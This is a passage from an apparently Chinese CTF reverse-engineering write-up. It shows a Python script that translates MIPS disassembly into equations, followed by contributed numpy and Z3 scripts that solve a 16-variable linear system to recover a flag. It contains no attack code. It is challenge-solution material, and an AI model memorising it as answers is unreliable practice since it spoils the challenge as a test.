0x42d1f0, 0x0, 0x42d1f0,</span><br><span class="line">0xa, 0xa, 0x0, 0x9,</span><br><span class="line">0x4250bc, 0x9, 0x426630, 0x42d1f0,</span><br><span class="line">0x40a3ec, 0x37343431, 0x363434, 0x0,</span><br><span class="line">0x0, 0x42d1f0, 0x0, 0x4250bc,</span><br><span class="line">0x0, 0x0, 0x425060, 0x42d1f0,</span><br><span class="line">0x403ad0, 0x0, 0x0, 0x1000,</span><br><span class="line">0x425088, 0x76fff184, 0x412fcd, 0x1,</span><br><span class="line">0x410570, 0x425190, 0x40ca48, 0x0,</span><br><span class="line">0x0, 0x42d1f0, 0x0, 0x42d1f0,</span><br><span class="line">0x425088, 0xffffffff, 0x4106c4, 0xffffffff,</span><br><span class="line">0x76fff184, 0x412fcd, 0x1, 0x42d1f0,</span><br><span class="line">0x0, 0x425088, 0x40ccac, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x42d1f0,</span><br><span class="line">0x0, 0x425190, 0x76ffeef8, 0x425190,</span><br><span class="line">0x10, 0x425088, 0x40baac, 0x42d1f0,</span><br><span class="line">0x412fcd, 0x1, 0x425088, 0x40baac,</span><br><span class="line">0x76fff184, 0x412fce, 0x40b684, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x42d1f0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x42d1f0, 0x0, 0x42d1f0,</span><br><span class="line">0x0, 0x4250bc, 0x413081, 0x9,</span><br><span class="line">0x403f24, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x42d1f0,</span><br><span class="line">0x0, 0x413078, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0xd0000, 0xf1f4,</span><br><span class="line">0xcf8, 0xf5f1, 0x7883, 0xe2c6,</span><br><span class="line">0x67, 0xeccc, 0xc630, 0xba2e,</span><br><span class="line">0x6e41, 0x641d, 0x716d, 0x4505,</span><br><span class="line">0x76fff224, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0xfffffffe, 0x0,</span><br><span class="line">0x76fff2ac, 0x412fcd, 0x1, 0x0,</span><br><span class="line">0x6, 0x7fffffff, 0x1, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0xa, 0xa, 0x425088, 0x8,</span><br><span class="line">0x7ffffff8, 0x100, 0x413f38, 0x1,</span><br><span class="line">0x413f38, 0x0, 0x2, 0x76fff0f8,</span><br><span class="line">0x0, 0x0, 0x7fffffff, 0x76fff220,</span><br><span class="line">0x405050, 0x550001, 0x0, 0x425000,</span><br><span class="line">0x0, 0x0, 0x0, 0x0,</span><br><span class="line">0x0, 0x0, 0x0, 0x76fff220,</span><br><span class="line">0x404d84, 0x42d1f0, 0x0, 0x500,</span><br><span class="line">0x5, 0x42d1f0, 0xb3b, 0x76fff224,</span><br><span class="line">0x115, 0x1a131100, 0x76fff220, 0x76fff270,</span><br><span class="line">0x76fff2ac, 0xffbecf88, 0xa, 0x405880]</span><br><span class="line">j = 0</span><br><span class="line">functions = 0</span><br><span class="line">for i in range(0xb4, 0x410, 4):</span><br><span class="line">    fp[i] = table[j]</span><br><span class="line">    j += 1</span><br><span class="line">input = [int(str(i)*3, 16) for i in range(16)]</span><br><span class="line">try:</span><br><span class="line">    while(True):</span><br><span class="line">        code = f.readline()</span><br><span class="line">        if(code == &quot;&quot;):</span><br><span class="line">            print(&quot;finish&quot;)</span><br><span class="line">            break</span><br><span class="line">        if(code[:3] == &quot;loc&quot;):</span><br><span class="line">            # print(&quot;\n[s]:\t&quot; + code[:-1])</span><br><span class="line">            continue</span><br><span class="line">        if(code.find(&quot;nop&quot;)!=-1):</span><br><span class="line">            continue</span><br><span class="line">        code = code.split(&quot;$&quot;)</span><br><span class="line">        # print(code)</span><br><span class="line"></span><br><span class="line">        c = code[0].strip()</span><br><span class="line"></span><br><span class="line">        if(c==&quot;sw&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = 0x410 - int(&quot;0x&quot; + code[1].split(&quot;_&quot;)[1].split(&quot;(&quot;)[0], 16)</span><br><span class="line">            code = (&quot;fp[&quot; + hex(n2) + &quot;] = &quot; + n1)</span><br><span class="line">        elif(c==&quot;li&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n2)</span><br><span class="line">        elif(c==&quot;lw&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            if(&quot;&quot;.join(code).find(&quot;fp&quot;)!=-1):</span><br><span class="line">                n2 = 0x410 - int(&quot;0x&quot; + code[1].split(&quot;_&quot;)[1].split(&quot;(&quot;)[0], 16)</span><br><span class="line">                code = (n1 + &quot; = fp[&quot; + hex(n2) + &quot;]&quot;)</span><br><span class="line">                # print(&quot;# &quot; + hex(fp[n2]))</span><br><span class="line">                #输出方程</span><br><span class="line">                print(&quot;0x%x*&quot;%fp[n2],end=&apos;&apos;)</span><br><span class="line">            else:</span><br><span class="line">                # print(&quot;[c]:\t&quot; + &quot;&quot;.join(code)[:-1], &quot;v0=%x&quot;%v0)</span><br><span class="line">                n2 = ((v0) + int(code[1].split(&quot;,&quot;)[1].replace(&quot;(&quot;, &quot;&quot;)))//4</span><br><span class="line">                code = (n1 + &quot; = input[&quot; + str(n2) + &quot;]&quot;)</span><br><span class="line">                print(&quot;a[%d]&quot;%n2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                # print(code)</span><br><span class="line">                # print(hex(v0))</span><br><span class="line">                # break</span><br><span class="line">        elif(c==&quot;sll&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n1 + &quot;&lt;&lt;&quot; + n2)</span><br><span class="line">        elif(c==&quot;sra&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n1 + &quot;&gt;&gt;&quot; + n2)</span><br><span class="line">        elif(c==&quot;xori&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n1 + &quot;^&quot; + n2)</span><br><span class="line">        elif(c==&quot;addiu&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n1 + &quot;+&quot; + n2)</span><br><span class="line">            # print(&quot;+&quot;)</span><br><span class="line">        elif(c==&quot;mul&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[2].split(&quot;,&quot;)[0].strip()</span><br><span class="line">            n3 = code[3].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n2 + &quot;*&quot; + n3)</span><br><span class="line">        elif(c==&quot;addu&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[2].split(&quot;,&quot;)[0].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n1 + &quot;+&quot; + n2)</span><br><span class="line">            print(&quot;+&quot;)</span><br><span class="line">        elif(c==&quot;subu&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[2].split(&quot;,&quot;)[0].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n1 + &quot;-&quot; + n2)</span><br><span class="line">            print(&quot;-&quot;)</span><br><span class="line">        elif(c==&quot;beq&quot;):</span><br><span class="line">            print(&quot;=0x%x&quot;%(v0))</span><br><span class="line">            print(&quot;================================================one function=====================================&quot;)</span><br><span class="line">            functions +=1</span><br><span class="line">            continue</span><br><span class="line">        elif(c==&quot;negu&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[2].split(&quot;,&quot;)[0].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + &quot;-&quot; + n2)</span><br><span class="line">            print(&quot;-&quot;)</span><br><span class="line">        elif(c==&quot;nop&quot;):</span><br><span class="line">            continue</span><br><span class="line">        elif(c==&quot;lui&quot;):</span><br><span class="line">            n1 = code[1].split(&quot;,&quot;)[0]</span><br><span class="line">            n2 = code[1].split(&quot;,&quot;)[1].strip()</span><br><span class="line">            code = (n1 + &quot; = &quot; + n2 + &quot;&lt;&lt;32&quot;)</span><br><span class="line">        elif(c==&quot;move&quot; or c==&quot;and&quot;):</span><br><span class="line">            continue</span><br><span class="line">        elif(c in flower):</span><br><span class="line">            # print(&quot;[f]:\t&quot; + &quot;&quot;.join(code)[:-1])</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            print(&quot;[x]:\tFind unknown code | &quot; + &quot;&quot;.join(code))</span><br><span class="line">            break</span><br><span class="line">        # print(&quot;[-]:\t&quot; + code)</span><br><span class="line">        exec(code)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(repr(e))</span><br><span class="line">    print(code)</span><br><span class="line">print(functions)</span><br><span class="line"># print(fp)</span><br></pre></td></tr></table></figure><h3 id="解方程"><a href="#解方程" class="headerlink" title="解方程"></a>解方程</h3><p>解方程的方法很多<br>比如Python的有</p><blockquote><p>Numpy 求解线性方程组<br>SciPy 求解非线性方程组<br>SymPy</p></blockquote><p>上面三个有个链接可以参照<a href="https://zhuanlan.zhihu.com/p/24893371" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/24893371</a></p><h4 id="numpy求解"><a href="#numpy求解" class="headerlink" title="numpy求解"></a>numpy求解</h4><p>来自‘niuwuwu’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">from scipy.linalg import solve</span><br><span class="line">A=[</span><br><span class="line">    [-56251,64497,-61787,29993,-16853,2147,-51990,-36278,-34108,-1148,1798,-43452,-16150,-56087,-17677,-41752],</span><br><span class="line">    [-39354,63754,50513,2396,-37448,43585,19468,-4688,-62869,-20663,41173,61113,30862,38224,-601,53899],</span><br><span class="line">    [26798,-58888,14929,-21751,-12385,55961,-20714,24897,40045,9805,25147,39173,-21952,-42840,37937,-8559],</span><br><span class="line">    [-2789,53359,16747,54195,-30020,39916,-32582,60338,13971,27307,-30484,47826,37554,64914,-1745,27669],</span><br><span class="line">    [40374,6523,13380,-53413,-1194,7796,-31815,-51866,-40252,-56883,57811,23278,-5785,61525,-6984,-7335],</span><br><span class="line">    [-57052,-64573,-62351,2628,21493,12939,-60006,435,15009,-4091,22743,4901,48803,-43203,5263,-32994],</span><br><span class="line">    [54760,41053,22537,-56473,46316,19787,-40180,2088,2044,26575,-5207,31098,-23838,21642,46750,13706],</span><br><span class="line">    [-40176,-43382,48718,-25423,21452,-36714,-24119,-13231,-52192,49742,54709,-32636,20233,21460,48733,15155],</span><br><span class="line">    [38446,-880,-2443,50487,-46973,-56178,-37138,-9079,-19096,-60988,-1823,-21538,43896,-4141,-19370,-47796],</span><br><span class="line">    [5176,18400,-53852,36119,-32120,47724,17154,5390,-29717,14471,8755,1432,-45518,-8148,-56623,-48254],</span><br><span class="line">    [30203,-50712,-27560,-16075,3618,590,44305,20581,33442,-7743,-43075,-16234,45723,-44899,42321,49264],</span><br><span class="line">    [42705,-32299,-19156,5594,28870,8059,58103,-60723,-32112,-7128,45985,-24915,63910,18427,-51408,22619],</span><br><span class="line">    [-57517,20738,-32286,55995,26666,37550,-51489,13733,32455,-2897,-39622,-54523,50733,-24649,-17849,-62326],</span><br><span class="line">    [-15716,-38264,64476,-37524,-61551,13536,12920,1407,-63767,-55105,-46543,-36562,-20712,2063,-6668,9074],</span><br><span class="line">    [47490,18611,52416,3107,32177,-41780,11008,7223,5652,881,26719,-28444,46077,-272,-32475,-9432],</span><br><span class="line">    [-58938,-35689,35708,44689,45902,36614,38550,731,49990,6727,61526,-35587,-39199,-43886,-56409,-25519],</span><br><span class="line">]</span><br><span class="line">B=[-24232262,17175305,8705731,26962228,-6384428,-15459013,19554563,-188243,-19590071,-12754495,6442406,-2869966,-4805280,-18964176,8938201,3896470]</span><br><span class="line"></span><br><span class="line">a = np.array(A)</span><br><span class="line">b = np.array(B)</span><br><span class="line">x =solve(a,b)</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><hr><p>来自‘ljt1000’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">A  = &quot;-15858,-48466,32599,38605,-44159,23939,45662,9287,47754,47937,41896,51986,-26968,22561,30701,63487;&quot;</span><br><span class="line">A += &quot;60228,-3993,-16615,57134,-19246,-38581,40294,-44968,-28198,-58965,-39534,22458,-8828,48593,46135,23871;&quot;</span><br><span class="line">A += &quot;59121,42162,-65140,-3847,-23842,-47173,-39252,37804,-20964,-19217,56467,5112,9324,61729,61599,3578;&quot;</span><br><span class="line">A += &quot;-36731,-26147,1670,19245,26847,39911,8628,57946,-51207,63125,-21537,-9321,40745,-58129,30962,-27610;&quot;</span><br><span class="line">A += &quot;-63560,-53320,-34289,61060,-14289,46922,53218,36638,-61969,-33727,-4681,32423,-17044,-46689,-35443,-24156;&quot;</span><br><span class="line">A += &quot;-10571,-11103,51585,-24771,63730,57047,-63227,4227,-56470,-22654,-46325,62842,22480,59412,24937,62085;&quot;</span><br><span class="line">A += &quot;52617,-54333,61495,33704,-41733,-44527,51882,-61765,-24691,-10103,31055,61454,-59349,9812,-48848,-47279;&quot;</span><br><span class="line">A += &quot;-40696,-26470,54670,-23715,10008,7723,-62622,53112,31753,-5047,-48878,-58448,19875,-34944,-22161,35800;&quot;</span><br><span class="line">A += &quot;-23196,-43354,-58947,3384,-2426,-60194,51907,-20177,-31882,61703,42398,-4627,45749,-29203,-11139,-41301;&quot;</span><br><span class="line">A += &quot;-37819,-10066,-48579,-62613,-28961,40001,-37989,-27875,-20264,-33616,-5998,30740,-29594,21652,5165,51797;&quot;</span><br><span class="line">A += &quot;52993,62328,4196,-55719,-1917,28075,-44831,-15799,13652,-52110,-38933,62219,40030,-23815,-19505,60128;&quot;</span><br><span class="line">A += &quot;35796,-28033,-59250,46833,39767,-22909,5585,-42334,64787,6068,60536,-54554,22189,-49945,40846,64023;&quot;</span><br><span class="line">A += &quot;-18536,-35823,4253,-63956,20175,43158,30523,28298,-29564,18809,50821,-38574,3005,33408,58281,-29452;&quot;</span><br><span class="line">A += &quot;2848,39836,46250,24950,38512,31901,-21506,-36050,44162,41717,-36605,-26097,-38073,36024,7349,19105;&quot;</span><br><span class="line">A += &quot;22525,15747,63301,42436,-26106,-22761,48830,6176,-55225,-45599,-30368,50701,5775,10902,12758,-19336;&quot;</span><br><span class="line">A += &quot;-58450,-51156,-5460,32490,-26701,27355,34100,-14902,10736,54258,-9189,-25920,48339,-61339,61403,-30542&quot;</span><br><span class="line"></span><br><span class="line">b = &quot;23261386,-1298872,13877344,9172342,-11622989,10343966,-9721165,-8286458,-7515929,-12609498,2179053,11137244,12446496,10255605,854242,1542147&quot;</span><br><span class="line"></span><br><span class="line">A = np.mat(A)</span><br><span class="line">b = np.mat(b).T</span><br><span class="line">r = np.linalg.solve(A,b)</span><br><span class="line">print r</span><br></pre></td></tr></table></figure><h4 id="Z3约束器求解方程"><a href="#Z3约束器求解方程" class="headerlink" title="Z3约束器求解方程"></a>Z3约束器求解方程</h4><p>Z3可以说很出名了<br>这里有个教程<a href="http://ericpony.github.io/z3py-tutorial/guide-examples.htm" target="_blank" rel="noopener">http://ericpony.github.io/z3py-tutorial/guide-examples.htm</a></p><p>来自‘奈沙夜影’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">a = [BitVec(&quot;a%d&quot;%i, 32) for i in range(16)]</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(0xca6a*a[0] -0xd9ee*a[1] +0xc5a7*a[2] +0x19ee*a[3] +0xb223*a[4] +0x42e4*a[5] +0xc112*a[6] -0xcf45*a[7] +0x260d*a[8] +0xd78d*a[9] +0x99cb*a[10] -0x3e58*a[11] -0x97cb*a[12] +0xfba9*a[13] -0xdc28*a[14] +0x859b*a[15]  == 0xaa2ed7)</span><br><span class="line">s.add(0xf47d*a[0] +0x12d3*a[1] -0x4102*a[2] +0xcedf*a[3] -0xafcf*a[4] -0xeb20*a[5] -0x2065*a[6] +0x36d2*a[7] -0x30fc*a[8] -0x7e5c*a[9] +0xeea8*a[10] +0xd8dd*a[11] -0xae2*a[12] +0xc053*a[13] +0x5158*a[14] -0x8d42*a[15]  == 0x69d32e)</span><br><span class="line">s.add(0xffff52cf*a[0] -0x4fea*a[1] +0x2075*a[2] +0x9941*a[3] -0xbd78*a[4] +0x9e58*a[5] +0x40ad*a[6] -0x8637*a[7] -0x2e08*a[8] +0x4414*a[9] +0x2748*a[10] +0x1773*a[11] +0xe414*a[12] -0x7b19*a[13] +0x6b71*a[14] -0x3dcf*a[15]  == 0x3b89d9)</span><br><span class="line">s.add(0xffffedd7*a[0] -0x1df0*a[1] +0x8115*a[2] +0x54bd*a[3] -0xf2ba*a[4] +0xdbd*a[5] +0x1dcf*a[6] +0x272*a[7] -0x2fcc*a[8] -0x93d8*a[9] -0x6f6c*a[10] -0x98ff*a[11] +0x2148*a[12] -0x6be2*a[13] +0x2e56*a[14] -0x7bdf*a[15]  == 0xff6a5aea)</span><br><span class="line">s.add(0xffffa8c1*a[0] +0xdc78*a[1] -0x380f*a[2] +0x33c0*a[3] -0x7252*a[4] -0xe5a9*a[5] +0x7a53*a[6] -0x4082*a[7] -0x584a*a[8] +0xc8db*a[9] +0xd941*a[10] +0x6806*a[11] -0x8b97*a[12] +0x23d4*a[13] +0xac2a*a[14] +0x20ad*a[15]  == 0x953584)</span><br><span class="line">s.add(0x5bb7*a[0] -0xfdb2*a[1] +0xaaa5*a[2] -0x50a2*a[3] -0xa318*a[4] +0xbcba*a[5] -0x5e5a*a[6] +0xf650*a[7] +0x4ab6*a[8] -0x7e3a*a[9] -0x660c*a[10] +0xaed9*a[11] -0xa60f*a[12] +0xf924*a[13] -0xff1d*a[14] +0xc888*a[15]  == 0xffd31341)</span><br><span class="line">s.add(0x812d*a[0] -0x402c*a[1] +0xaa99*a[2] -0x33b*a[3] +0x311b*a[4] -0xc0d1*a[5] -0xfad*a[6] -0xc1bf*a[7] -0x1560*a[8] -0x445b*a[9] -0x9b78*a[10] +0x3b94*a[11] +0x2531*a[12] -0xfb03*a[13] +0x8*a[14] +0x8721*a[15]  == 0xff9a6b57)</span><br><span class="line">s.add(0x15c5*a[0] +0xb128*a[1] -0x957d*a[2] +0xdf80*a[3] +0xee68*a[4] -0x3483*a[5] -0x4b39*a[6] -0x3807*a[7] -0x4f77*a[8] +0x652f*a[9] -0x686f*a[10] -0x7fc1*a[11] -0x5d2b*a[12] -0xb326*a[13] -0xacde*a[14] +0x1f11*a[15]  == 0xffd6b3d3)</span><br><span class="line">s.add(0xaf37*a[0] +0x709*a[1] +0x4a95*a[2] -0xa445*a[3] -0x4c32*a[4] -0x6e5c*a[5] -0x45a6*a[6] +0xb989*a[7] +0xf5b7*a[8] +0x3980*a[9] -0x151d*a[10] +0xaf13*a[11] +0xa134*a[12] +0x67ff*a[13] +0xce*a[14] +0x79cf*a[15]  == 0xc6ea77)</span><br><span class="line">s.add(0xffff262a*a[0] +0xdf05*a[1] -0x148e*a[2] -0x4758*a[3] -0xc6b2*a[4] -0x4f94*a[5] -0xf1f4*a[6] +0xcf8*a[7] +0xf5f1*a[8] -0x7883*a[9] -0xe2c6*a[10] -0x67*a[11] +0xeccc*a[12] -0xc630*a[13] -0xba2e*a[14] -0x6e41*a[15]  == 0xff1daae5)</span><br><span class="line">s.add(0xffff9be3*a[0] -0x716d*a[1] +0x4505*a[2] -0xb99d*a[3] +0x1f00*a[4] +0x72bc*a[5] -0x7ff*a[6] +0x8945*a[7] -0xcc33*a[8] -0xab8f*a[9] +0xde9e*a[10] -0x6b69*a[11] -0x6380*a[12] +0x8cee*a[13] -0x7a60*a[14] +0xbd39*a[15]  == 0xff5be0b4)</span><br><span class="line">s.add(0x245e*a[0] +0xf2c4*a[1] -0xeb20*a[2] -0x31d8*a[3] -0xe329*a[4] +0xa35a*a[5] +0xaacb*a[6] +0xe24d*a[7] +0xeb33*a[8] +0xcb45*a[9] -0xdf3a*a[10] +0x27a1*a[11] +0xb775*a[12] +0x713e*a[13] +0x5946*a[14] +0xac8e*a[15]  == 0x144313b)</span><br><span class="line">s.add(0x157*a[0] -0x5f9c*a[1] -0xf1e6*a[2] +0x550*a[3] -0x441b*a[4] +0x9648*a[5] +0x8a8f*a[6] +0x7d23*a[7] -0xe1b2*a[8] -0x5a46*a[9] -0x5461*a[10] +0xee5f*a[11] -0x47e6*a[12] +0xa1bf*a[13] +0x6cf0*a[14] -0x746b*a[15]  == 0xffd18bd2)</span><br><span class="line">s.add(0xf81b*a[0] -0x76cb*a[1] +0x543d*a[2] -0x4a85*a[3] +0x1468*a[4] +0xd95a*a[5] +0xfbb1*a[6] +0x6275*a[7] +0x30c4*a[8] -0x9595*a[9] -0xdbff*a[10] +0x1d1d*a[11] +0xb1cf*a[12] -0xa261*a[13] +0xf38e*a[14] +0x895c*a[15]  == 0xb5cb52)</span><br><span class="line">s.add(0xffff6b97*a[0] +0xd61d*a[1] +0xe843*a[2] -0x8c64*a[3] +0xda06*a[4] +0xc5ad*a[5] +0xd02a*a[6] -0x2168*a[7] +0xa89*a[8] +0x2dd*a[9] -0x80cc*a[10] -0x9340*a[11] -0x3f07*a[12] +0x4f74*a[13] +0xb834*a[14] +0x1819*a[15]  == 0xa6014d)</span><br><span class="line">s.add(0x48ed*a[0] +0x2141*a[1] +0x33ff*a[2] +0x85a9*a[3] -0x1c88*a[4] +0xa7e6*a[5] -0xde06*a[6] +0xbaf6*a[7] +0xc30f*a[8] -0xada6*a[9] -0xa114*a[10] -0x86e9*a[11] +0x70f9*a[12] +0x7580*a[13] -0x51f8*a[14] -0x492f*a[15]  == 0x2fde7c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(s.check()==sat):</span><br><span class="line">    c = b&apos;&apos;</span><br><span class="line">    m = s.model()</span><br><span class="line">    for i in range(16):</span><br><span class="line">        print(&quot;a[%d]=%d&quot;%(i, m[a[i]].as_long()))</span><br><span class="line">    for i in range(16):</span><br><span class="line">        print(chr(m[a[i]].as_long()&amp;0xff), end=&apos;&apos;)</span><br></pre></td></tr></table></figure><hr><p>来自‘cq674350529’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">a = [BitVec(&apos;a%d&apos; %i, 32) for i in xrange(16)]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(0xffffc20e*a[0]-0xbd52*a[1]+0x7f57*a[2]+0x96cd*a[3]-0xac7f*a[4] +0x5d80*a[5]+0xb25e*a[6]+0x2447*a[7]+0xba8a*a[8]+0xbb41*a[9]+0xa3a8*a[10]+0xcb12*a[11]-0x6958*a[12]+0x5821*a[13]+0x77ed*a[14]+0xf7ff*a[15] == 0x162f0ca )</span><br><span class="line">s.add(0xeb44*a[0]-0x0f99*a[1] - 0x40e7*a[2] +0xdf2e*a[3] -0x4b2e*a[4] -0x96b5*a[5] +0x9d66*a[6] -0xafa8*a[7] -0x6e26*a[8] -0xe655*a[9]- 0x9a6e*a[10] +0x57ba*a[11] -0x227c*a[12] +0xbdd1*a[13] +0xb437*a[14] +0x5d3f*a[15]== 0xffec2e48)</span><br><span class="line">s.add(0xe6f1*a[0] +0xa4b2*a[1] -0xfe74*a[2] -0x0f07*a[3] -0x5d22*a[4] -0xb845*a[5] -0x9954*a[6] +0x93ac*a[7] -0x51e4*a[8] -0x4b11*a[9] +0xdc93*a[10] +0x13f8*a[11] +0x246c*a[12] +0xf121*a[13] +0xf09f*a[14] +0x0dfa*a[15] == 0xd3c060)</span><br><span class="line">s.add(0xffff7085*a[0] -0x6623*a[1] +0x0686*a[2] +0x4b2d*a[3] +0x68df*a[4] +0x9be7*a[5] +0x21b4*a[6] +0xe25a*a[7] -0xc807*a[8] +0xf695*a[9] -0x5421*a[10] -0x2469*a[11] +0x9f29*a[12] -0xe311*a[13] +0x78f2*a[14] -0x6bda*a[15] == 0x8bf576)</span><br><span class="line">s.add(0xffff07b8*a[0] -0xd048*a[1] -0x85f1*a[2] +0xee84*a[3] -0x37d1*a[4] +0xb74a*a[5] +0xcfe2*a[6]+ 0x8f1e*a[7] -0xf211*a[8] -0x83bf*a[9] -0x1249*a[10] +0x7ea7*a[11] -0x4294*a[12] -0xb661*a[13] -0x8a73*a[14] -0x5e5c*a[15] == 0xff4ea5b3)</span><br><span class="line">s.add(0xffffd6b5*a[0] -0x2b5f*a[1]+ 0xc981*a[2] -0x60c3*a[3] +0xf8f2*a[4]+ 0xded7*a[5]- 0xf6fb*a[6] +0x1083*a[7]- 0xdc96*a[8]- 0x587e*a[9] -0xb4f5*a[10] +0xf57a*a[11] +0x57d0*a[12] +0xe814*a[13] +0x6169*a[14] +0xf285*a[15] == 0x9dd61e)</span><br><span class="line">s.add(0xcd89*a[0] -0xd43d*a[1] +0xf037*a[2] +0x83a8*a[3] -0xa305*a[4] -0xadef*a[5] +0xcaaa*a[6] -0xf145*a[7]- 0x6073*a[8]- 0x2777*a[9] +0x794f*a[10] +0xf00e*a[11] -0xe7d5*a[12] +0x2654*a[13] -0xbed0*a[14] -0xb8af*a[15] == 0xff6baab3)</span><br><span class="line">s.add(0xffff6108*a[0] -0x6766*a[1] +0xd58e*a[2] -0x5ca3*a[3] +0x2718*a[4] +0x1e2b*a[5] -0xf49e*a[6] +0xcf78*a[7] +0x7c09*a[8] -0x13b7*a[9] -0xbeee*a[10]- 0xe450*a[11] +0x4da3*a[12] -0x8880*a[13] -0x5691*a[14] +0x8bd8*a[15] == 0xff818f06)</span><br><span class="line">s.add(0xffffa564*a[0] -0xa95a*a[1] -0xe643*a[2] +0x0d38*a[3] -0x097a*a[4] -0xeb22*a[5] +0xcac3*a[6] -0x4ed1*a[7] -0x7c8a*a[8] +0xf107*a[9] +0xa59e*a[10]- 0x1213*a[11] +0xb2b5*a[12] -0x7213*a[13] -0x2b83*a[14] -0xa155*a[15] == 0xff8d50e7)</span><br><span class="line">s.add(0xffff6c45*a[0] -0x2752*a[1] -0xbdc3*a[2] -0xf495*a[3] -0x7121*a[4] +0x9c41*a[5] -0x9465*a[6]- 0x6ce3*a[7] -0x4f28*a[8] -0x8350*a[9] -0x176e*a[10] +0x7814*a[11] -0x739a*a[12] +0x5494*a[13] +0x142d*a[14] +0xca55*a[15] == 0xff3f9826)</span><br><span class="line">s.add(0xcf01*a[0] +0xf378*a[1] +0x1064*a[2] -0xd9a7*a[3] -0x077d*a[4]+ 0x6dab*a[5] -0xaf1f*a[6]- 0x3db7*a[7] +0x3554*a[8] -0xcb8e*a[9] -0x9815*a[10]+ 0xf30b*a[11] +0x9c5e*a[12] -0x5d07*a[13] -0x4c31*a[14] +0xeae0*a[15] == 0x213fed)</span><br><span class="line">s.add(0x8bd4*a[0] -0x6d81*a[1] -0xe772*a[2] +0xb6f1*a[3] +0x9b57*a[4] -0x597d*a[5] +0x15d1*a[6]- 0xa55e*a[7]+ 0xfd13*a[8]+ 0x17b4*a[9] +0xec78*a[10] -0xd51a*a[11] +0x56ad*a[12] -0xc319*a[13] +0x9f8e*a[14] +0xfa17*a[15] == 0xa9f0dc)</span><br><span class="line">s.add(0xffffb798*a[0] -0x8bef*a[1] +0x109d*a[2]- 0xf9d4*a[3] +0x4ecf*a[4] +0xa896*a[5] +0x773b*a[6] +0x6e8a*a[7] -0x737c*a[8]+ 0x4979*a[9] +0xc685*a[10] -0x96ae*a[11] +0x0bbd*a[12] +0x8280*a[13] +0xe3a9*a[14] -0x730c*a[15] == 0xbdeb20)</span><br><span class="line">s.add(0x0b20*a[0] +0x9b9c*a[1] +0xb4aa*a[2]+ 0x6176*a[3] +0x9670*a[4] +0x7c9d*a[5] -0x5402*a[6] -0x8cd2*a[7] +0xac82*a[8] +0xa2f5*a[9] -0x8efd*a[10] -0x65f1*a[11] -0x94b9*a[12] +0x8cb8*a[13] +0x1cb5*a[14] +0x4aa1*a[15] == 0x9c7cf5)</span><br><span class="line">s.add(0x57fd*a[0] +0x3d83*a[1] +0xf745*a[2] +0xa5c4*a[3] -0x65fa*a[4] -0x58e9*a[5] +0xbebe*a[6] +0x1820*a[7] -0xd7b9*a[8] -0xb21f*a[9] -0x76a0*a[10] +0xc60d*a[11] +0x168f*a[12] +0x2a96*a[13] +0x31d6*a[14] 